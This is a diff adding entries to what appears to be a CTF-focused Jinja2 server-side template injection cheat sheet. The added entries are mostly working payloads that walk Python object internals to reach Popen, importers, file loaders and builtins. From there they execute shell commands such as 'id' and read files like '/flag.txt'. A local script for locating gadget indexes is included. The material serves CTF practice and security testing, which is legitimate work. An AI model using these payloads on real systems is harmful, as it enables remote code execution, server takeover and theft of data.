@@ -105,13 +105,82 @@ Subclass route:
 {{''.__class__.__base__.__subclasses__()[IDX]('cat /flag.txt', shell=True, stdout=-1).communicate()[0]}}
 ```
 
+Dump Python classes/gadgets:
+
+```jinja
+{% for c in ''.__class__.__mro__[1].__subclasses__() %}{{loop.index0}} {{c.__module__}}.{{c.__name__}}<br>{% endfor %}
+{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if 'Popen' in c.__name__ or 'Importer' in c.__name__ or 'File' in c.__name__ or 'warning' in c.__name__ or 'wrap' in c.__name__ %}{{loop.index0}} {{c}}<br>{% endif %}{% endfor %}
+{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__module__ in ['subprocess','warnings','_frozen_importlib','_frozen_importlib_external','os','abc','io','_io'] %}{{loop.index0}} {{c.__module__}}.{{c.__name__}}<br>{% endif %}{% endfor %}
+```
+
+Inspect one class before using it:
+
+```jinja
+{{''.__class__.__mro__[1].__subclasses__()[IDX]}}
+{{''.__class__.__mro__[1].__subclasses__()[IDX].__dict__}}
+{{''.__class__.__mro__[1].__subclasses__()[IDX].__init__}}
+{{''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__}}
+{{''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__builtins__}}
+```
+
+Useful class/gadget names to search:
+
+```text
+subprocess.Popen
+_frozen_importlib.BuiltinImporter
+_frozen_importlib_external.FileLoader
+_io.FileIO
+os._wrap_close
+warnings.catch_warnings
+abc.ABCMeta
+collections.Counter
+```
+
+Use found gadgets:
+
+```jinja
+{# subprocess.Popen #}
+{{''.__class__.__mro__[1].__subclasses__()[IDX]('id', shell=True, stdout=-1).communicate()[0]}}
+{{''.__class__.__mro__[1].__subclasses__()[IDX](['cat','/flag.txt'], stdout=-1).communicate()[0]}}
+
+{# _frozen_importlib.BuiltinImporter #}
+{{''.__class__.__mro__[1].__subclasses__()[IDX].load_module('os').popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[IDX].load_module('os').system('id')}}
+
+{# _frozen_importlib_external.FileLoader #}
+{{''.__class__.__mro__[1].__subclasses__()[IDX].get_data('.', '/flag.txt')}}
+
+{# os._wrap_close or warnings.catch_warnings style globals #}
+{{''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['system']('id')}}
+{{''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+```
+
+Builtins/sys/modules routes:
+
+```jinja
+{{lipsum.__globals__['__builtins__']}}
+{{cycler.__init__.__globals__['__builtins__']}}
+{{get_flashed_messages.__globals__['__builtins__']}}
+{{lipsum.__globals__['__builtins__']['open']('/flag.txt').read()}}
+{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{lipsum.__globals__.os.sys.modules}}
+{{lipsum.__globals__.os.sys.modules['os'].popen('id').read()}}
+{{lipsum.__globals__.os.sys.modules['builtins'].open('/flag.txt').read()}}
+```
+
 Python helper to find index locally:
 
 ```python
+needles = ("Popen", "BuiltinImporter", "FileLoader", "FileIO", "_wrap_close",
+           "catch_warnings", "ABCMeta", "Counter")
+
 for i, c in enumerate("".__class__.__base__.__subclasses__()):
-    if "Popen" in c.__name__:
-        print(i, c)
+    name = f"{c.__module__}.{c.__name__}"
+    if any(n.lower() in name.lower() for n in needles):
+        print(i, name, c)
 ```
+
+Subclass indexes differ by Python version and imported modules. Dump, search by name/module, then replace `IDX`.
 
 Flask secret:
 
@@ -738,6 +807,7 @@ tinja url -u 'http://HOST/' -d 'name=x'
 * [HackTricks: Jinja2 SSTI](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html)
 * [HackTricks legacy mirror: SSTI](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection)
 * [P=NP Flask/Jinja2 SSTI cheatsheet](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
+* [Shirajuki: Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/)
 * [DefCamp 2023 SSTI slides](https://def.camp/wp-content/uploads/dc2023/Remi%20Gascou.pdf)
 * [CTFtime: TokyoWesterns CTF Shrine](https://ctftime.org/writeup/10895)
 * [CTFtime: PatriotCTF Mr. O](https://ctftime.org/writeup/33605)
